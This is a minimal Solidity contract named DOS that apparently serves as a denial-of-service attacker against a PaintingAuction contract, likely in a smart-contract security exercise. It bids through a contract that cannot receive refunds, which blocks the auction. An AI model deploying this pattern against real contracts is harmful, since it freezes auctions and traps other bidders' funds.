// SPDX-License-Identifier: MIT

pragma solidity ^0.8.23;
import "./PantingAuction.sol";

contract DOS {
    function setBid(address _address) external payable{
        PaintingAuction(_address).Bid{value: msg.value}();
    }
}